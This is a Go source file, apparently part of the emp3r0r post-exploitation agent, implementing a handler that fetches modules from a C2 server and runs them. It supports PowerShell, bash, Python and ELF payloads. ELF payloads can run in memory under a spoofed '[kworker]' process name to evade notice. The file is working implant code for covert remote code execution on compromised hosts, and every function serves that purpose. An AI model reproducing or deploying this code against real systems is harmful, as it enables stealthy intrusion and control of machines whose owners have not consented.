package modules

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/jm33-m0/arc"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ModuleHandler downloads and runs modules from C2
// env: in format "VAR1=VALUE1,VAR2=VALUE2"
func ModuleHandler(download_addr, file_to_download, payload_type, modName, checksum, exec_cmd string, env []string, inMem bool) (out string) {
	tarball := filepath.Join(common.RuntimeConfig.AgentRoot, modName+".tar.xz")
	modDir := filepath.Join(common.RuntimeConfig.AgentRoot, modName)
	var err error

	// download and verify module file
	payload_data_downloaded, downloadErr := downloadAndVerifyModule(file_to_download, checksum, download_addr)
	if downloadErr != nil {
		return downloadErr.Error()
	}
	payload_data := payload_data_downloaded

	if inMem {
		// in memory execution
		payload_data, err = arc.DecompressXz(payload_data_downloaded)
		if err != nil {
			return fmt.Sprintf("decompressing %s: %v", file_to_download, err)
		}
	} else {
		// on disk execution
		if err := prepareModuleOnDisk(tarball, modDir, payload_data); err != nil {
			return err.Error()
		}
	}

	// construct command
	var (
		executable string
		args       = []string{}
	)
	fields := strings.Fields(exec_cmd)
	if !inMem {
		if len(fields) == 0 {
			return fmt.Sprintf("empty exec_cmd: %s (env: %v)", strconv.Quote(exec_cmd), env)
		}
		executable = fields[0]
	}

	// switch on payload type, in memory execution
	switch payload_type {
	case "powershell":
		out, err := agentutils.RunPSScript(payload_data, env)
		if err != nil {
			return fmt.Sprintf("running powershell script: %s (%v)", out, err)
		}
		return out
	case "bash":
		executable = def.DefaultShell
		log.Printf("shell executable: %s", executable)
		out, err := agentutils.RunShellScript(payload_data, env)
		if err != nil {
			return fmt.Sprintf("running shell script: %s (%v)", out, err)
		}
		return out
	case "python":
		executable = "python"
		args = []string{exec_cmd}
		if inMem {
			out, err := agentutils.RunPythonScript(payload_data, env)
			if err != nil {
				return fmt.Sprintf("running python script: %s (%v)", out, err)
			}
			return out
		}
	case "elf":
		if inMem {
			outChan := make(chan string)
			go func() {
				randName := fmt.Sprintf("[kworker/%d:%d-events]", util.RandInt(0, 20), util.RandInt(0, 10))
				// if you need to pass arguments to the in-memory module, you can do it in environment variables
				// when implementing the module, you can read the arguments from env
				out, err = exe_utils.InMemExeRun(payload_data, []string{randName}, env)
				if err != nil {
					out = fmt.Sprintf("InMemExeRun: %v", err)
				}
				outChan <- fmt.Sprintf("Success\n%s", out)
			}()
			select {
			case out = <-outChan:
				return out
			case <-time.After(10 * time.Second):
				out = "Timeout while waiting for in-memory module to print output"
				return out
			}
		}
	default:
		// on disk modules
		args = fields[1:]
	}

	// interactive modules
	if executable == "echo" {
		out = crypto.SHA256SumRaw([]byte(def.MagicString))
		log.Printf("echo: %s", out)
		return
	}

	// normal on disk modules, run exec_cmd
	if !inMem {
		defer os.Chdir(common.RuntimeConfig.AgentRoot)
		err = os.Chdir(modDir)
		if err != nil {
			return fmt.Sprintf("cd to %s: %v", modDir, err)
		}
	}
	cmd := exec.Command(executable, args...)
	cmd.Env = env
	log.Printf("Running %v (%v)", cmd.Args, cmd.Env)
	outBytes, err := cmd.CombinedOutput()
	out = string(outBytes)
	if err != nil {
		return fmt.Sprintf("running %s: %s (%v)", strconv.Quote(exec_cmd), out, err)
	}

	return out
}

func prepareModuleOnDisk(tarball, modDir string, payload_data []byte) error {
	// Create agent root if not exist
	if !util.IsDirExist(common.RuntimeConfig.AgentRoot) {
		if err := os.MkdirAll(common.RuntimeConfig.AgentRoot, 0o700); err != nil {
			return fmt.Errorf("creating %s: %v", common.RuntimeConfig.AgentRoot, err)
		}
	}

	// write-to-disk modules
	err := os.WriteFile(tarball, payload_data, 0o600)
	if err != nil {
		return fmt.Errorf("writing %s: %v", tarball, err)
	}

	if extractErr := extractModule(modDir, tarball); extractErr != nil {
		return extractErr
	}

	// cd to module dir
	defer os.Chdir(common.RuntimeConfig.AgentRoot)
	err = os.Chdir(modDir)
	if err != nil {
		return fmt.Errorf("cd to %s: %v", modDir, err)
	}

	return nil
}

func downloadAndVerifyModule(file_to_download, checksum, download_addr string) (data []byte, err error) {
	if crypto.SHA256SumFile(file_to_download) != checksum {
		if data, err = c2transport.SmartDownload(download_addr, file_to_download, "", checksum); err != nil {
			return nil, fmt.Errorf("downloading %s: %v", file_to_download, err)
		}
	}

	if crypto.SHA256SumRaw(data) != checksum {
		log.Print("Checksum failed, restarting...")
		util.TakeABlink()
		os.RemoveAll(file_to_download)
		return downloadAndVerifyModule(file_to_download, checksum, download_addr) // Recursive call
	}
	return data, nil
}

func extractModule(modDir, tarball string) error {
	os.RemoveAll(modDir)
	if err := util.Unarchive(tarball, common.RuntimeConfig.AgentRoot); err != nil {
		return fmt.Errorf("unarchive module tarball: %v", err)
	}

	return processModuleFiles(modDir)
}

func processModuleFiles(modDir string) error {
	files, err := os.ReadDir(modDir)
	if err != nil {
		return fmt.Errorf("processing module files: %v", err)
	}

	for _, f := range files {
		if err := os.Chmod(filepath.Join(modDir, f.Name()), 0o700); err != nil {
			return fmt.Errorf("setting permissions for %s: %v", f.Name(), err)
		}

		libsTarball := filepath.Join(modDir, "libs.tar.xz")
		if util.IsExist(libsTarball) {
			os.RemoveAll(filepath.Join(modDir, "libs"))
			if err := util.Unarchive(libsTarball, modDir); err != nil {
				return fmt.Errorf("unarchive %s: %v", libsTarball, err)
			}
		}
	}
	return nil
}
